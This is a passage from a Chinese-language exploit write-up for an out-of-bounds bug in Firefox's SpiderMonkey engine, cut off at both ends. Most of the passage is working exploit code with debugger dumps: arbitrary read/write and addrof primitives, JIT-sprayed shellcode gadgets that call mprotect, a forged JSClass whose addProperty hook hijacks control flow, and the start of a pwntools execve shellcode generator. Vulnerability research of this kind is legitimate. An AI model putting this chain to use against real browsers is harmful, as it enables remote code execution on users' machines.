    //..................
    Please wait...
    [+]: 0 96
    [+]: 1 96
    [+]: 2 96
    [+]: 3 96
    [+]: 4 96
    [+]: 5 96
    [+]: 6 256
    [+]: 7 96
    [+]: 8 96
    [+]: 9 96
    [+]: 10 96
    [+]: 11 96
    [+]: 12 96
    [+]: 13 96
    [+]: 14 96
    [+]: 15 96
到了这里，我们已经有了越界读写的能力了，后续的漏洞利用都比较通用化，基本的流程如下
  * 1 构造 任意地址读写
  * 2 往 `jit` 写入shellcode
  * 3 伪造`JSClass` ，修改`addProperty` 字段劫持控制流
###  构造任意地址读写
有了数组越界，构造任意地址读写就不难了, 首先泄露出`0x00001064f249c230` 这个地址，`0x00001064f249c230>1
    0x20c9e4938440: 0x00001064f249c230      0xfff8800000000100// buf[7].byteLength
    0x20c9e4938450: 0xfffa000000000000      0xfff8800000000000
    0x20c9e4938460: 0x0000000000000000      0x0000000000000000
这里还需要构造一个`addrof`, 当执行`buf[7].leak = {}` 的时候，它会放在前面`slots` 处，把`data buffer`
改成`0x00007fffcfcfb600>>1` 然后读`buf[7]` 就可以泄露出 对象的地址了
    pwndbg> x/20gx 0x112c38f204c0
    0x112c38f204c0: 0x0000160cb7b59a30      0x0000112c38f22380
                    //slots
    0x112c38f204d0: 0x00007fffcfcfb600      0x00007fffeb5170c0
                    //data buffer
    0x112c38f204e0: 0x000008961c790280      0xfff8800000000060
    0x112c38f204f0: 0xfffe38a368b3d180      0xfff8800000000000
    0x112c38f20500: 0x0000000000000000      0x0000000000000000
    0x112c38f20510: 0x0000000000000000      0x0000000000000000
    //.....
    pwndbg> x/10gx 0x00007fffcfcfb600
    0x7fffcfcfb600: 0xfffe112c38f2f300      0x0000000000000000
    0x7fffcfcfb610: 0x0000000000000000      0x0000000000000000
    0x7fffcfcfb620: 0x0000000000000000      0x0000000000000000
    0x7fffcfcfb630: 0x0000000000000000      0x0000000000000000
具体实现代码如下, `spidermonkey` 的对象都会加上一个 `tag` ，读的时候把它去掉就行
    function readptr(addr){
            oob64[16] = i2f(addr/2);
            oob[34] = 0x100;
            ptrleak = new Uint32Array(buf[7]);
            leak = ptrleak[0] + (ptrleak[1]&0x7fff)*0x100000000;
            return leak;
    }
    function addrof(obj){
            buf[7].leak = obj;
            return readptr(buf7_slots_addr);
    }
    function write64(addr,data){
            oob64[16] = i2f(addr/2);
            oob[34] = 0x100;
            towrite = new Float64Array(buf[7]);
            towrite[0] = i2f(data);
    }
###  jit 写入 shellcode
因为`jit` 中的代码有可执行权限，如果可以往`jit` 中写入shellcode, 那么劫持控制流之后直接跳到`jit`
执行就完事了，但是`spidermonkey` 的`jit` 是`r_x` 权限的，不可直接写入，但是我们可以像下面这样把数据传入到`r_x` 段
    print(d2f(0x41424344,0x61626364));
    print(d2f(0x13371337,0x13371337));
    //2393736.760815071      
    //4.183559446463817e-216 
    function tmp(){
            const a=2393736.760815071;
            const b=4.183559446463817e-216;
    }
    for(let i=0;i search -t qword 0x4142434461626364                           
                    0x15b165d2926e movsxd rsp, dword ptr fs:[rdx + 0x61] 
    pwndbg> x/20gx 0x15b165d2926e                                  
    0x15b165d2926e: 0x4142434461626364      0x1337bb49c85d894c     
    0x15b165d2927e: 0x894c133713371337      0x00000000b948c05d     
    pwndbg> x/20gx 0x15b165d2926e+6+8                              
    0x15b165d2927c: 0x1337133713371337      0x0000b948c05d894c     
    0x15b165d2928c: 0x45f7fff980000000      0x04840f00000001fc
可以看到`0x4142434461626364` 和`0x1337133713371337` 都被存入到了`jit`
上，但是他们内存是不连续的，原本的jit代码如下
    pwndbg> x/10i 0x15b165d2926e-6                              
       0x15b165d29268:      mov    QWORD PTR [rbp-0x40],r11     
       0x15b165d2926c:      movabs r11,0x4142434461626364       
       0x15b165d29276:      mov    QWORD PTR [rbp-0x38],r11     
       0x15b165d2927a:      movabs r11,0x1337133713371337       
       0x15b165d29284:      mov    QWORD PTR [rbp-0x40],r11     
       0x15b165d29288:      movabs rcx,0xfff9800000000000       
       0x15b165d29292:      test   DWORD PTR [rbp-0x4],0x1
但是没有关系，因为可以利用`const` 一次往`jit` 写入`8`个byte，`const`
之间内存地址是连续的，可以写入多个gadget，构造`gadget1 => jmp gadget2 => jmp gadget3` 这样
最终写入的shellcode 如下
    func = function func() {
        // 0x1337133713371337
      const magic = 4.183559446463817e-216;
      //0x67490c038098b48 mov    rcx,QWORD PTR [rcx] ;cmp    al,al; nop
      const g1 = 1.4501798452584495e-277
      //0x6749000100068 push   0x1000; nop
      const g2 = 1.4499730218924257e-277
      //0x674c038ff31485e pop    rsi ;xor    rdi,rdi;cmp    al,al
      const g3 = 1.4632559875735264e-277
      //0x6745f00fff68 push   0xfff;pop    rdi;
      const g4 = 1.4364759325952765e-277
      //0x674909090d7f748     not    rdi;nop;nop;nop
      const g5 = 1.450128571490163e-277
      //0x67490c038cf2148  and    rdi,rcx;cmp    al,al;nop
      const g6 = 1.4501798485024445e-277
      //0x674580a6a5a076a push   0x7;pop rdx;push 0xa; pop rax;
      const g7 = 1.4345589835166586e-277
      //0x0c3050f51  push   rcx; syscall; ret
      const g8 = 1.616527814e-314
    }
每个`const` 最后两个byte 都写入`0x74 0x06`, 对应`je pc+8` ，shellcode 达到的效果相当于是调用
    mprotect(rcx,0x1000,0x7);
    jmp rcx
即把`rcx` 对应的内存变成`rwx` 权限
### 伪造 `JSClasss`
接着我们看看如何劫持控制流, 在执行`a.a=xxx` 添加`properties` 时，如果`addProperty` 字段不为`null`,
则会调用执行`addProperty` 对应的函数，假如我们修改了`addProperty` 到`jit` 的地址，就可以执行我们的shellcode,
还有一点就是执行`a.x = new Object()` 的时候`rcx` 上会保存`new Object` 的地址，也就是说结合`jit`中的
`mprotect` ，我们可以做到把任意地址改为`rwx` 权限
但是实际上，`classp_` 是const 类型，保存在`r--` 段上，是不可写的，
但是没有关系，`spidermonkey`并没有很严格的堆隔离机制，我们可以伪造整个`ObjectGroup`, 然后把 `addProperty`
字段改成`jit` 的地址即可
    pwndbg> x/20gx 0x112c38f204c0
                    // group
    0x112c38f204c0: 0x0000160cb7b59a30      0x0000112c38f22380
    0x112c38f204d0: 0x00007fffcfcfb600      0x00007fffeb5170c0
    0x112c38f204e0: 0x000008961c790280      0xfff8800000000060
    pwndbg> vmmap 0x0000160cb7b59a30
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x160cb7b00000     0x160cb7c00000 rw-p   100000 0 
    //...
    pwndbg> x/10gx 0x0000160cb7b59a30
                    //classp_
    0x160cb7b59a30: 0x00007fffed1f2240      0x00003b6e9bcba240
    0x160cb7b59a40: 0x00007fffd3de6800      0x0000000040000018
    pwndbg> vmmap 0x00007fffed1f2240
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x7fffece8c000     0x7fffed235000 r--p   3a9000 6f7e000 /home/prb/firefox/libxul.so
    //...
    pwndbg> x/20gx 0x00007fffed1f2240
                    //name                //flags
    0x7fffed1f2240: 0x00007fffeb12daff      0x000000005d000402
                    //cOps
    0x7fffed1f2250: 0x00007fffed1f24c0      0x00007fffed1f26b0
    0x7fffed1f2260: 0x00007fffed1f2238      0x0000000000000000
    0x7fffed1f2270: 0x00007fffeb52bbcd      0x000000005c000000
    //..
    pwndbg> x/20gx 0x00007fffed1f24c0
                    //addProperty
    0x7fffed1f24c0: 0x0000000000000000      0x0000000000000000
    0x7fffed1f24d0: 0x0000000000000000      0x0000000000000000
    0x7fffed1f24e0: 0x0000000000000000      0x0000000000000000
    0x7fffed1f24f0: 0x00007fffea567390      0x0000000000000000
    0x7fffed1f2500: 0x0000000000000000      0x0000000000000000
    0x7fffed1f2510: 0x00007fffea5673f0      0x0000000000000000
实现部分代码如下, 参考前面的内存布局
                 //group_addr == 0x0000160cb7b59a30
                // group_jsclass == 0x00007fffed1f2240 
                group_jsclass = readptr(group_addr);
                    print("group_jsclass "+hex(group_jsclass));
                    fake_jsclass_array = new ArrayBuffer(0x30);
                    fake_cops_array = new ArrayBuffer(0x60);
                    shellcode = new Uint8Array(0x1000);
                    fake_jsclass_addr = addrof(fake_jsclass_array)+0x40;
                    fake_cops_addr = addrof(fake_cops_array) + 0x40;
                    fake_jsclass = new Float64Array(fake_jsclass_array);
                    fake_cops = new Float64Array(fake_cops_array);
                    // 完整拷贝一份 classp_ 的内容
                    fake_jsclass[0]=i2f(readptr(group_jsclass+0x0));//name
                    fake_jsclass[1]=i2f(readptr(group_jsclass+0x8));//flags
                    fake_jsclass[2]=i2f(readptr(group_jsclass+0x10));//cOps
                    fake_jsclass[3]=i2f(readptr(group_jsclass+0x18));//spec
                    fake_jsclass[4]=i2f(readptr(group_jsclass+0x20));//ext
                    fake_jsclass[5]=i2f(readptr(group_jsclass+0x28));//oOps
                    print("fake jsclass: "+hex(fake_jsclass_addr));
                    print(fake_jsclass);
                    cops_addr = f2i(fake_jsclass[2]);
                    // 完整拷贝一份 ClassOps 的内容
                    for(let i =0;i fake_cops
                    fake_jsclass[2] = i2f(fake_cops_addr);
                    // cOps -> addProperty --> jit_addr
                    fake_cops[0] = i2f(jit_addr);
                    shellcode_obj_addr = addrof(shellcode) ;
                    shellcode_addr = readptr(shellcode_obj_addr+0x38) ;
                    print(hex(shellcode_obj_addr));
                    print(hex(shellcode_addr));
                    // group_addr  --> fake_jsclass
                  write64(group_addr,fake_jsclass_addr);
###  任意代码执行
前面的 `JSClass` 伪造完成之后，只要执行`buf[7].jjj=i2f(shellcode_addr)`, 就会跳转去执行`jit`
上的shellcode, `rcx == shellcode_addr`, `shellcode_addr` 对应的内存变成`rwx`,
往这块内存写入shellcode就可以任意代码执行啦。我们希望可以弹出一个计算器出来, 这里我写了一个生成 shellcode 的脚本
    from pwn import *
    context.arch='amd64'
    cmd='/usr/bin/xcalc'
    env='DISPLAY=:0'
    #cmd='/bin/bash'
    #env='x00'
    cmd_off = 0x50
    env_off = cmd_off + len(cmd) + 0x20
    shellcode='''
    lea    rdi, [rip + %d]
    xor    rsi, rsi
    push   rsi